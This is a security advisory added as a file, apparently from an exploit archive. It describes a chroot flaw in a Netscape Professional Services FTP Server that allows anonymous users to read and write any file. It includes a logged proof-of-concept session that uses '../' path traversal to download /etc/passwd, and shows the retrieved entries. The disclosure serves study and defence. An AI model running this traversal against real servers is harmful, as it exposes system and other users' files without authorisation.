@@ -1,0 +1,57 @@
+source: http://www.securityfocus.com/bid/1411/info
+
+Certain versions of the LDAP-aware Netscape Professional Services FTP Server (distributed with Enterprise Web Server) have a serious vulnerability which may lead to a remote or local root compromise. The vulnerability in essence is a failure of of the FTP server to enforce a restricted user environment (chroot). By failing to do this an FTP (anonymous or otherwise) user may download any file on the system (/etc/passwd etc.) as well as upload files at will at the privilege level of the FTP daemon.
+
+Furthermore (quoted from the original attached message) this FTP server supports LDAP users; different LDAP accounts are served on single physical UID. This means, any user can access and eventually overwrite files on other accounts; as it's used in cooperation with webserver, typically virtual web servers are affected. 
+
+$ ftp ftp.XXXX.xxx
+Connected to ftp.XXXX.xxx.
+220-FTP Server - Version 1.36 - (c) 1999 Netscape Professional Services
+220 You will be logged off after 1200 seconds of inactivity.
+Name (ftp.XXXX.xxx:lcamtuf): anonymous
+331 Anonymous user OK, send e-mail address as password.
+Password:
+230 Logged in OK
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd ../../../dupa
+550 Can't change directory to
+"/www1/customer/www.XXXX.xxx/a/n/o/n/anonymous/dupa" because No such
+file or directory
+
+[Well... this won't work... uh, lovely physical path, btw ;]
+
+ftp> cd /../../../dupa
+550 Can't change directory to
+"/www1/customer/www.XXXX.xxx/a/n/dupa" because No such file or
+directory
+ftp> cd /../../../../dupa
+550 Can't change directory to
+"/www1/customer/www.XXXX.xxx/a/dupa" because
+No such file or directory
+
+[Erm? Good God!]
+
+ftp> cd /../../../../../../../../etc/dupa
+550 Can't change directory to "/etc/dupa" because No such file or
+directory
+ftp> cd /../../../../../../../../etc/
+250 CWD command successful.
+ftp> get /../../../../../../../../etc/passwd KUKU
+local: KUKU remote: /../../../../../../../../etc/passwd
+200 PORT successfull, connected to A.B.C.D port 62437
+150-Type of object is "unknown/unknown". Transfer MODE is BINARY.
+150 Opening data connection
+226 File downloaded successfully (602 bytes, 602 bytes xmitted)
+602 bytes received in 1.71 secs (0.34 Kbytes/sec)
+ftp> quit
+221-Goodbye. You uploaded 0 and downloaded 1 kbytes.
+221 CPU time spent on you: 0.100 seconds.
+
+$ cat KUKU
+root:x:0:1:Super-User:/:/sbin/sh
+daemon:x:1:1::/:
+bin:x:2:2::/usr/bin:
+sys:x:3:3::/:
+adm:x:4:4:Admin:/var/adm:
+... 
